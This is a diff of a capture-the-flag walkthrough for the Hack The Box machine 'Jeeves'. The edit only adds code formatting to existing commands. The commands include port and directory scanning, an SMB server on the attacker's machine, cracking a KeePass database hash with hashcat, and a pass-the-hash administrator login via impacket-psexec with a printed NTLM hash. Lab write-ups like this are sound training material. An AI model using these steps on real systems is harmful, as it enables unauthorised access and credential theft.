@@ -2,21 +2,21 @@
 
 # ${{\color{purple}Initial Recon}}\ $
 
-nmap -sC -sV -oA jeeves 10.10.10.63 -T4
+``nmap -sC -sV -oA jeeves 10.10.10.63 -T4``
 
-80/tcp    open  http         Microsoft IIS httpd 10.0
+``80/tcp    open  http         Microsoft IIS httpd 10.0``
 
-135/tcp   open  msrpc        Microsoft Windows RPC
+``135/tcp   open  msrpc        Microsoft Windows RPC``
 
-445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
+``445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)``
 
-50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
+``50000/tcp open  http         Jetty 9.4.z-SNAPSHOT``
 
 # ${{\color{purple}Initial Foothold}}\ $
 
 ### After a long enumeration I found a directory on the port 50000 :
 
-gobuster dir -u http://10.10.10.63:50000/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
+``gobuster dir -u http://10.10.10.63:50000/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30``
 
 ![image](https://user-images.githubusercontent.com/123066149/221349079-693bf87d-ce77-42a4-9202-9c5870f16c3b.png)
 
@@ -48,7 +48,7 @@ gobuster dir -u http://10.10.10.63:50000/ -w /usr/share/wordlists/dirbuster/dire
 
 ### SMBserver on kali machine :
 
-/usr/bin/impacket-smbserver kali .
+````/usr/bin/impacket-smbserver kali .``
 
 ![image](https://user-images.githubusercontent.com/123066149/221350050-1069ded2-46ff-4bf3-8532-6e21b7196467.png)
 
@@ -64,7 +64,7 @@ gobuster dir -u http://10.10.10.63:50000/ -w /usr/share/wordlists/dirbuster/dire
 
 ### Generate the hash of this file :
 
-keepass2john CEH.kdbx
+``keepass2john CEH.kdbx``
 
 ![image](https://user-images.githubusercontent.com/123066149/221350158-dcc7110f-8e0c-4e31-afea-ded436ef0ae5.png)
 
@@ -74,7 +74,7 @@ keepass2john CEH.kdbx
 
 ### Finds the password with hashcat :
 
-hashcat -m 13400 hash.txt /usr/share/wordlists/rockyou.txt
+``hashcat -m 13400 hash.txt /usr/share/wordlists/rockyou.txt``
 
 ![image](https://user-images.githubusercontent.com/123066149/221350242-2a736320-afce-4401-a245-bd09e1496b46.png)
 
@@ -84,9 +84,9 @@ hashcat -m 13400 hash.txt /usr/share/wordlists/rockyou.txt
 
 ### I tried the admin password but without success and with the hash of the backup account and we are admin :
 
-/usr/bin/impacket-psexec  administrator@10.10.10.63
+``/usr/bin/impacket-psexec  administrator@10.10.10.63``
 
-/usr/bin/impacket-psexec  administrator@10.10.10.63 -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
+``/usr/bin/impacket-psexec  administrator@10.10.10.63 -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00``
 
 ![image](https://user-images.githubusercontent.com/123066149/221350360-0b5fb083-eb17-4532-892c-511109165051.png)
 
